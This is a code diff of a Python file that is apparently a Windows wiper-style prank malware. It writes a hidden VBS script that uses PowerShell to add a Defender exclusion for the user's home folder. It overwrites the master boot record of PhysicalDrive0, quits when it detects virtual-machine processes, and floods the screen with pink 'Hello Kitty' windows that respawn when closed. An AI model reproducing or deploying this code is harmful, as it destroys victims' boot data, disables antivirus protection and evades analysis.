@@ -12,9 +12,11 @@ if platform.release() != '10':
 from pathlib import Path
 from tkinter import messagebox
 import psutil
-import time
-from tkinter import *
 import random
+from random import randint
+from time import sleep
+from tkinter import *
+import tkinter as tk
 from win32gui import *
 from win32ui import *
 from win32con import *
@@ -85,7 +87,7 @@ objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.h
         ''')       
         text_file.close()
 
-        time.sleep(2)
+        sleep(2)
 
         os.system("attrib +h " + 'val.vbs')
 
@@ -98,6 +100,15 @@ objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.h
     elif os.path.isfile(DontDownloadPath):
         sys.exit()
 
+def DelMBR():
+    #Overwrite MBR
+    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
+    WriteFile(hDevice, AllocateReadBuffer(512), None)
+    CloseHandle(hDevice)
+
+    sleep(randint(5, 10))
+    Window()
+
 def AntiVm():
   #Searches for processes with the name, and when he has found a process, the program quits
   Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
@@ -108,15 +119,6 @@ def AntiVm():
 
 def CommitSuicide():
   sys.exit()
-
-def DelMBR():
-    #Overwrite MBR
-    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
-    WriteFile(hDevice, AllocateReadBuffer(512), None)
-    CloseHandle(hDevice)
-
-    time.sleep(random.randint(5, 10))
-    Window()
 
 def DTM():
     try:
@@ -135,11 +137,67 @@ def Window():
     window.wm_attributes("-topmost", 1)
 
     def on_closing():
-        pass
+        window_flush()
+
+    HelloKittyLabel = Label(window, text="Please don't kill me", font=("Arial",30,"bold"), fg="white", bg="pink")
+    HelloKittyLabel.pack()
+    HelloKittyLabel.place(x=370,y=100)
 
     window.protocol("WM_DELETE_WINDOW", on_closing)
     window.mainloop()
 
-if __name__ == '__main__':
-    #AntiVm() Optional
+def move_window(window, speed, dx, dy):
+    x, y = map(int, window.geometry().split("+")[1:])
+    w, h = window.winfo_width(), window.winfo_height()
+    if x + w >= 1920:
+        dx = -1 * abs(dx)
+    elif x <= 0:
+        dx = abs(dx)
+    if y + h >= 1080:
+        dy = -1 * abs(dy)
+    elif y <= 0:
+        dy = abs(dy)
+    window.geometry("{}x{}+{}+{}".format(w, h, x+dx*speed, y+dy*speed))
+    window.after(20, move_window, window, speed, dx, dy)
+
+def create_new_windows(window):
+    for i in range(3):
+        new_window = tk.Toplevel(window)
+        new_window.geometry(window.geometry())
+        speed = random.randint(15, 20)
+        dx = random.choice([-1, 1])
+        dy = random.choice([-1, 1])
+        new_window.title("Hello Kitty")
+        new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_windows(window))
+        new_window.configure(background='pink')
+        new_window.resizable(False, False)
+        new_window.attributes('-toolwindow', True)
+        new_window.wm_attributes("-topmost", 1)
+        new_window.after(20, move_window, new_window, speed, dx, dy)
+
+def window_flush():
+    root = tk.Tk()
+    root.withdraw()
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    
+    for i in range(4):
+        x_pos = random.randint(0, screen_width-250)
+        y_pos = random.randint(0, screen_height-150)
+        new_window = tk.Toplevel()
+        new_window.geometry("250x150+{}+{}".format(x_pos, y_pos))
+        speed = random.randint(15, 20)
+        dx = random.choice([-1, 1])
+        dy = random.choice([-1, 1])
+        new_window.title("Hello Kitty")
+        new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_windows(new_window))
+        new_window.configure(background='pink')
+        new_window.resizable(False, False)
+        new_window.attributes('-toolwindow', True)
+        new_window.wm_attributes("-topmost", 1)
+        new_window.after(20, move_window, new_window, speed, dx, dy)
+    
+    tk.mainloop()
+
+if __name__ == "__main__":
     Warning()
